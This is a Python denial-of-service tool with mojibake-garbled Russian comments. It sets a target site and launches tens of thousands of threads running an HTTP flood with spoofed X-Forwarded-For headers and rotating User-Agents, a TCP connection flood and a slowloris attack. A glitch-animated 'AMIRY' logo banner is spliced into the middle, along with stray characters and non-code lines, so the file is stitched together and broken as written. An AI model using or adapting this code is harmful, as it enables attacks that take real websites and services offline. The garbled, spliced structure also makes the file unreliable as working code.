import socket
import random
import threading
import time
import urllib.request
from datetime import datetime

# ===== –ù–ê–°–¢–†–û–ô–ö–ò ===== #
TARGET_URL = "https://deepweb.org"  # üîß –ó–∞–º–µ–Ω–∏ –Ω–∞ —Ü–µ–ª—å
THREADS = 50000                     # üíÄ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤
ATTACK_DURATION = 300              # ‚è±Ô∏è –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∞—Ç–∞–∫–∏ (—Å–µ–∫)
USE_PROXIES = False                # üåê –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–æ–∫—Å–∏ (True/False)
# ==================== #

# –°–ø–∏—Å–æ–∫ User-Agents –¥–ª—è –æ–±—Ö–æ–¥–∞ –∑–∞—â–∏—Ç—ã
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# –°–ø–∏—Å–æ–∫ –ø—Ä–æ–∫—Å–∏ (–µ—Å–ª–∏ USE_PROXIES = True)
PROXIES = [
    "103.154.230.87:3128",
    "45.95.147.106:8080"
]

# ===== –ê–¢–ê–ö–ò ===== #
def http_flood():
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            }
            req = urllib.request.Request(TARGET_URL, headers=headers)
            if USE_PROXIES:
                proxy = random.choice(PROXIES)
                req.set_proxy(proxy, "http")
            urllib.request.urlopen(req, timeout=5)
            print(f"[HTTP] Sent request to {TARGET_URL}")
        except:
            pass

def tcp_flood():
    target_ip = socket.gethostbyname(TARGET_URL.split("//")[-1].split("/")[0])
    target_port = 80
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode(), (target_ip, target_port))
            s.close()
            print(f"[TCP] Sent packet to {target_ip}:{target_port}")
        except:
            pass

def slowloris():
    target_ip = socket.gethostbyname(TARGET_URL.split("//")[-1].split("/")[0])
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 80))
            s.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            sockets.append(s)
        except:
            pass
    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
            except:
                pass
        time.sleep(15)

AMIRY_LOGO = r"""
    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó
   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù
   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù 
   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó  ‚ïö‚ñà‚ñà‚ïî‚ïù  
   ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   
   ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù   
"""


—Ç
import random
import time
import os

def show_glitched_amiry():
    glitch_chars = "‚ñì‚ñí‚ñë‚ï¨‚ï´‚ï™‚ï®‚ïß‚ï©‚ï¶‚ï£‚ï¢‚ï°‚ï†‚ïü‚ïû‚ïù‚ïú‚ïõ‚ïö‚ïô‚ïò‚ïó‚ïñ‚ïï‚ïî‚ïì‚ïí‚ïê‚ïë‚ïè‚îÉ‚îÜ‚îá‚îã‚îä‚îâ‚ïç‚ïå‚ïã"
    for _ in range(8):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[31m")  # –ö—Ä–∞—Å–Ω—ã–π —Ü–≤–µ—Ç
        
      
        glitched = []
        for line in AMIRY_LOGO.split('\n'):
            glitched_line = []
            for char in line:
                if random.random() > 0.7:
                    glitched_line.append(random.choice(glitch_chars))
                else:
                    glitched_line.append(char)
            glitched.append(''.join(glitched_line))
        
        print('\n'.join(glitched))
        time.sleep(0.1)
    
   
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[31m" + AMIRY_LOGO + "\033[0m")
    print("\n\033[31m[\033[91m‚ö†\033[31m] BYE BYE CRIME \033[0m")

# –ó–∞–ø—É—Å–∫ –∞–Ω–∏–º–∞—Ü–∏–∏
show_glitched_amiry()
Target: {TARGET_URL}
Threads: {THREADS}
Time: {ATTACK_DURATION} 

# –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫
for _ in range(THREADS):
    threading.Thread(target=http_flood, daemon=True).start()
    threading.Thread(target=tcp_flood, daemon=True).start()
    threading.Thread(target=slowloris, daemon=True).start()

# –¢–∞–π–º–µ—Ä
time.sleep(ATTACK_DURATION)
print("\n[!] Attack finished.")
